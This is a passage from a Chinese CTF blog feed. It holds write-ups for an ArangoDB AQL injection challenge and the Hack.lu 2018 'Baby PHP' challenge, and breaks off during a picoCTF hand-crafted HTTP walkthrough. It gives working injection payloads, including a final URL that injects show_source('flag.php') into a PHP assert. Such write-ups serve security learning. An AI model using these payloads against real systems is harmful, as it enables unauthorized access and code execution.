class="code"><pre><span class="line">user: '</span><br><span class="line">Error in: 1: FOR u IN users FILTER u.user == ''' &amp;&amp; u.passwd == '' RETURN u. -&gt;AQL: syntax error, unexpected quoted string near ''' RETURN u' at position 1:52 (while parsing). Errors: &#123;'error': True, 'errorMessage': "AQL: syntax error, unexpected quoted string near ''' RETURN u' at position 1:52 (while parsing)", 'code': 400, 'errorNum': 1501&#125;</span><br></pre></td></tr></table></figure><p>回显发现是ArangoDB 数据库注入</p><p>数据库查询语句是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR u IN users FILTER u.user == 'username' &amp;&amp; u.passwd == 'password' RETURN u</span><br></pre></td></tr></table></figure><p>构造payload查看用户名和密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: '|| 1 LIMIT 0,1 RETURN u //</span><br><span class="line">The user's 'role' is not 'admin'!</span><br></pre></td></tr></table></figure><p>发现回显此用户为非admin，通过limit读取第二个字段名和密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: '|| 1 LIMIT 1,1 RETURN u //</span><br><span class="line">User/Password comination does not exist!</span><br></pre></td></tr></table></figure><p>返回无用户名和密码，说明只存在一个用户，且此用户为非admin用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: '|| u.role RETURN u //</span><br><span class="line">The user's 'role' is not 'admin'!</span><br></pre></td></tr></table></figure><p>正常回显，发现存在role列名，猜测此用户的role列名为user（非admin）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: '|| u.role=='user' RETURN u //</span><br><span class="line">The user's 'role' is not 'admin'!</span><br></pre></td></tr></table></figure><p>正常回显，尝试使用admin身份</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: ' || 1 RETURN &#123;role:'admin'&#125; //</span><br><span class="line">result 0 is not a valid Document. Try setting rawResults to True. Errors: &#123;&#125;</span><br></pre></td></tr></table></figure><p>根据回显错误信息查找发现，Arango数据库使用 <a href="https://github.com/tariqdaouda/pyArango" target="_blank" rel="noopener">pyArango</a> 进行驱动程序</p><p><a href="https://github.com/tariqdaouda/pyArango/blob/master/pyArango/query.py" target="_blank" rel="noopener">pyArango索引</a></p><p>查找发现源码存在这一段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> :</span><br><span class="line">    collection = self.database[docJson[<span class="string">"_id"</span>].split(<span class="string">"/"</span>)[<span class="number">0</span>]]</span><br><span class="line"><span class="keyword">except</span> KeyError :</span><br><span class="line">    <span class="keyword">raise</span> CreationError(<span class="string">"result %d is not a valid Document. Try setting rawResults to True"</span> % i)</span><br></pre></td></tr></table></figure><p>通过查找发现 _id 为不可变数值 <a href="https://docs.arangodb.com/2.8/Documents/" target="_blank" rel="noopener">Documents, Identifiers, Handles</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  <span class="string">"_id"</span> : <span class="string">"myusers/3456789"</span>, </span><br><span class="line">  <span class="string">"_key"</span> : <span class="string">"3456789"</span>, </span><br><span class="line">  <span class="string">"_rev"</span> : <span class="string">"14253647"</span>, </span><br><span class="line">  <span class="string">"firstName"</span> : <span class="string">"John"</span>, </span><br><span class="line">  <span class="string">"lastName"</span> : <span class="string">"Doe"</span>, </span><br><span class="line">  <span class="string">"address"</span> : &#123; </span><br><span class="line">    <span class="string">"city"</span> : <span class="string">"Gotham"</span>, </span><br><span class="line">    <span class="string">"street"</span> : <span class="string">"Road To Nowhere 1"</span> </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//collection即为myusers</span></span><br></pre></td></tr></table></figure><p>尝试发送 _id : users</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: ' || 1 RETURN &#123;_id: 'users', role:'admin'&#125; //</span><br><span class="line">Nothing here. Meanwhile: flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</span><br></pre></td></tr></table></figure><p>出flag，也可通过 u._id 发送</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: ' || 1 RETURN &#123;_id: u._id, role:'admin'&#125; //</span><br><span class="line">Nothing here. Meanwhile: flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</span><br></pre></td></tr></table></figure><h2 id="Converter（376）"><a href="#Converter（376）" class="headerlink" title="Converter（376）"></a>Converter（376）</h2><blockquote><p>This nifty new tool lets you convert your thesis!</p></blockquote><p>待续。。后补</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwnctf居然有web题，，，&lt;/p&gt;
&lt;p&gt;日常复现学习一波。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Hack.lu CTF 2018 - Baby PHP</title>
    <link href="https://zo1ro.github.io/2018/10/22/babyphp/"/>
    <id>https://zo1ro.github.io/2018/10/22/babyphp/</id>
    <published>2018-10-22T13:27:01.000Z</published>
    <updated>2019-05-09T16:32:17.048Z</updated>
    
    <content type="html"><![CDATA[<p>题目描述</p><blockquote><p>PHP is a popular general-purpose scripting language that is especially suited to web development.</p><p>Fast, flexible and pragmatic, PHP powers everything from your blog to the most popular websites in the world.</p><p>Can you untangle this mess?!</p></blockquote><a id="more"></a><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br><span class="line"></span><br><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=<span class="number">1</span>;<span class="comment">//;"b"=a$;"2" = b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good Job ;)"</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;</span></span><br></pre></td></tr></table></figure><p>大致思路如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msg bypassed</span><br><span class="line">//php://input</span><br><span class="line">k1==&gt;key1 bypassed</span><br><span class="line">//key1=1337</span><br><span class="line">key2 bypassed</span><br><span class="line">//为了能过通过get传入cc覆盖</span><br><span class="line"><span class="meta">$</span>$a!==$k1</span><br><span class="line">//\u202e</span><br><span class="line">//$‮b=1;//;"b"=a$;"2" = b</span><br><span class="line">//$k1=2</span><br><span class="line"><span class="meta">$</span>cc</span><br><span class="line">//array bypassed</span><br><span class="line"><span class="meta">$</span>bb 全局变量覆盖</span><br><span class="line">//注释后print flag</span><br></pre></td></tr></table></figure><p>首先第一步进行msg bypassed</p><p>赛后发现也可以用这种方法进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=data:<span class="comment">//text/plain,Hello%20Challenge!</span></span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="http://php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a></p><p>然后进行k1==》key1 bypassed</p><p>ubuntu安装php环境进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">删除所有的php包</span><br><span class="line">sudo apt-get purge `dpkg -l | grep php| awk '&#123;print $2&#125;' |tr "\n" " "`</span><br><span class="line">添加PPA源</span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">安装PHP版本</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php5.6</span><br><span class="line">运行php shell环境</span><br><span class="line">php -a</span><br></pre></td></tr></table></figure><p>进行测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $cc=<span class="number">1337</span>;</span><br><span class="line">php &gt; $k1=<span class="string">'1337'</span>;</span><br><span class="line">php &gt; var_dump(intval($k1) !== $cc || $k1 === $cc);</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>bypassed</p><p>然后来到这题的亮点，在于$$a!==$k1，也就是如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$b=<span class="number">1</span>;<span class="comment">//;"b"=a$;"2" = b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">​    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个小trick，参考   <a href="https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick" target="_blank" rel="noopener">RTLO Trick</a></p><p>大致意思就是在文本前插入\u202e就会反向输出后续的字符</p><p><img src="2.png" alt="2"></p><p>插入\u202e后</p><p><img src="3.png" alt="3"></p><p>这里的代码示意如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b=<span class="number">1</span>;<span class="comment">//;"b"=a$;"2" = b</span></span><br><span class="line">$‮b=<span class="number">1</span>;<span class="comment">//;"b"=a$;"2" = b</span></span><br></pre></td></tr></table></figure><p>也可以通过鼠标移动发现代码</p><p><img src="1.png" alt="1"></p><p>故构造$k1=2即可bypassed</p><p>然后来到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后为了能get传参cc覆盖原变量，我们必须bypassed 这一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的$是美元符号，占三个字节，编码为\xEF\xBC\x84</p><p>可以看到这里构造的key2必须满足以美元符号结尾，且必须为非数字类型，且key2==$cc (1337)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $k2=<span class="string">'000000000000000000000000000000000001337＄'</span>;</span><br><span class="line">php &gt; $bb=<span class="number">42</span>;</span><br><span class="line">php &gt; var_dump(strlen($k2) == $bb);</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2));</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">php &gt; var_dump($k2==$cc);</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>接下来就是简单的array bypassed</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(strlen(sha1(<span class="string">"a"</span>)));</span><br><span class="line">int(<span class="number">40</span>)</span><br><span class="line">php &gt;</span><br><span class="line">var_dump(substr(<span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1231231aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>,<span class="number">42</span>));</span><br><span class="line">string(<span class="number">40</span>) <span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span></span><br><span class="line">    php &gt; var_dump(substr([], <span class="number">42</span>));</span><br><span class="line">PHP Warning:  substr() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line"><span class="keyword">NULL</span></span><br><span class="line">php &gt; var_dump(sha1([]));</span><br><span class="line">PHP Warning:  sha1() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line"><span class="keyword">NULL</span></span><br><span class="line">php &gt; var_dump(substr([], <span class="number">42</span>) === sha1([]));</span><br><span class="line">PHP Warning:  substr() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line">PHP Warning:  sha1() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">php &gt; var_dump(substr([], <span class="number">42</span>) === sha1([]));</span><br><span class="line">PHP Warning:  substr() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line">PHP Warning:  sha1() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>之后的foreach含义即为get获取的参数覆盖全局变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; function action($a)&#123;foreach ($a as $lel =&gt; $hack)&#123;$$lel = $hack;echo $$lel;&#125;&#125;</span><br><span class="line">php &gt; $c=['123','456'];</span><br><span class="line">php &gt; action($c);</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><p>可以看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br></pre></td></tr></table></figure><p>这里参考 <a href="http://php.net/manual/en/function.assert-options.php" target="_blank" rel="noopener">assert_options</a></p><p>利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br></pre></td></tr></table></figure><p>通过注释掉后面的==$cc进行文件读取，构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bb=show_source(<span class="string">'flag.php'</span>);<span class="comment">//</span></span><br><span class="line"><span class="comment">//构成</span></span><br><span class="line">assert(<span class="string">"show_source('flag.php');// == $cc"</span>);</span><br></pre></td></tr></table></figure><p>最终payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?msg=data:<span class="comment">//text/plain,Hello%20Challenge!&amp;key1=1337&amp;k1=2&amp;key2=000000000000000000000000000000000001337%ef%bc%84&amp;cc[]=&amp;bb=show_source('flag.php');//</span></span><br></pre></td></tr></table></figure><p>继续补坑。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目描述&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP is a popular general-purpose scripting language that is especially suited to web development.&lt;/p&gt;
&lt;p&gt;Fast, flexible and pragmatic, PHP powers everything from your blog to the most popular websites in the world.&lt;/p&gt;
&lt;p&gt;Can you untangle this mess?!&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018picoctf复现I</title>
    <link href="https://zo1ro.github.io/2018/10/15/2018pico1/"/>
    <id>https://zo1ro.github.io/2018/10/15/2018pico1/</id>
    <published>2018-10-15T03:31:54.000Z</published>
    <updated>2019-05-09T16:33:23.278Z</updated>
    
    <content type="html"><![CDATA[<p>日常复现补坑，来自2018picoctf的好题</p><a id="more"></a><h3 id="Artisinal-Handcrafted-HTTP-3"><a href="#Artisinal-Handcrafted-HTTP-3" class="headerlink" title="Artisinal Handcrafted HTTP 3"></a>Artisinal Handcrafted HTTP 3</h3><blockquote><p>We found a hidden flag server hiding behind a proxy, but the proxy has some… <em>interesting</em> ideas of what qualifies someone to make HTTP requests. Looks like you’ll have to do this one by hand. Try connecting via <code>nc 2018shell1.picoctf.com 58662</code>, and use the proxy to send HTTP requests to <code>flag.local</code>. We’ve also recovered a username and a password for you to use on the login page: <code>realbusinessuser</code>/<code>potoooooooo</code>.</p></blockquote><p>在验证之后会有一个手动提交http请求的shell</p><p><img src="1.png" alt></p><p>跟着题目走</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: flag.local</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf-8</span><br><span class="line">content-length: 321</span><br><span class="line">etag: W/"141-LuTf9ny9p1l454tuA3Un+gDFLWo"</span><br><span class="line">date: Mon, 15 Oct 2018 14:27:00 GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &lt;html&gt;</span><br><span class="line">                        &lt;head&gt;</span><br><span class="line">                                &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">                        &lt;/head&gt;</span><br><span class="line">                        &lt;body&gt;</span><br><span class="line">                                &lt;header&gt;</span><br><span class="line">                                        &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">                                        &lt;a href="/login"&gt;Login&lt;/a&gt;</span><br><span class="line">                                &lt;/header&gt;</span><br><span class="line">                                &lt;main&gt;</span><br><span class="line">                                        &lt;p&gt;You need to log in before you can see today's flag.&lt;/p&gt;</span><br><span class="line">                                &lt;/main&gt;</span><br><span class="line">                        &lt;/body&gt;</span><br><span class="line">                &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后继续send /login GET</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">GET /login HTTP/1.1</span><br><span class="line">Host: flag.local</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf-8</span><br><span class="line">content-length: 498</span><br><span class="line">etag: W/"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"</span><br><span class="line">date: Mon, 15 Oct 2018 14:28:51 GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &lt;html&gt;</span><br><span class="line">                        &lt;head&gt;</span><br><span class="line">                                &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">                        &lt;/head&gt;</span><br><span class="line">                        &lt;body&gt;</span><br><span class="line">                                &lt;header&gt;</span><br><span class="line">                                        &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">                                        &lt;a href="/login"&gt;Login&lt;/a&gt;</span><br><span class="line">                                &lt;/header&gt;</span><br><span class="line">                                &lt;main&gt;</span><br><span class="line">                                        &lt;h2&gt;Log In&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">                                        &lt;form method="POST" action="login"&gt;</span><br><span class="line">                                                &lt;input type="text" name="user" placeholder="Username" /&gt;</span><br><span class="line">                                                &lt;input type="password" name="pass" placeholder="Password" /&gt;</span><br><span class="line">                                                &lt;input type="submit" /&gt;</span><br><span class="line">                                        &lt;/form&gt;</span><br><span class="line">                                &lt;/main&gt;</span><br><span class="line">                        &lt;/body&gt;</span><br><span class="line">                &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>跟着题目提示send  user=realbusinessuser&amp;pass=potoooooooo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: flag.local</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 38</span><br><span class="line">user=realbusinessuser&amp;pass=potoooooooo</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">x-powered-by: Express</span><br><span class="line">set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br><span class="line">location: /</span><br><span class="line">vary: Accept</span><br><span class="line">content-type: text/plain; charset=utf-8</span><br><span class="line">content-length: 23</span><br><span class="line">date: Mon, 15 Oct 2018 14:31:17 GMT</span><br><span class="line">connection: close</span><br></pre></td></tr></table></figure><p>然后发现一个302 redirect，并带有cookie，发包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: flag.local</span><br><span class="line">Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf-8</span><br><span class="line">content-length: 438</span><br><span class="line">etag: W/"1b6-P3X+Gp97q63F5nCePqT+lsVPEas"</span><br><span 